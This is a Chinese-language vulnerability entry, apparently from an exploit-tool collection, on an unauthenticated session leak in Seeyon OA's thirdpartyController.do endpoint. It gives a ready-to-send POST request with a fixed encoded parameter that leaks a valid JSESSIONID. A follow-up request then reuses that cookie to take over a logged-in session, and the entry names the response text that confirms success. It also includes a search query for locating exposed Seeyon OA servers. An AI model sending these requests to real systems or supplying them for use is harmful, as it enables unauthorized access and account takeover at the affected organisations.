---
source: "LittleBear4/OA-EXPTOOL"
---

# 致远OA thirdpartyController.do 未授权访问漏洞

## 漏洞描述

致远OA 的 `thirdpartyController.do` 接口因默认的管理 ID 导致 session 泄露。攻击者未授权访问该接口即可获取有效 JSESSIONID，进而冒用已登录会话。

## 漏洞复现

```
POST /seeyon/thirdpartyController.do HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: deflate

method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4
```

从响应中提取 `JSESSIONID`，携带该 Cookie 访问：

```
GET /seeyon/main.do HTTP/1.1
Host: target
Cookie: JSESSIONID=<泄露的Session值>
```

响应状态码为 200，且响应体包含 `当前已登录了一个用户，同一窗口中不能登录多个用户` 与 `<a href='/seeyon/main.do?method=logout'` 即表示已成功冒用会话。

## 网络测绘

```
app="致远互联-OA"
```

## 参考链接

- https://mp.weixin.qq.com/s/0AqdfTrZUVrwTMbKEKresg（微信原文链接；本条目利用细节依据 OA-EXPTOOL 模板中的完整 PoC）
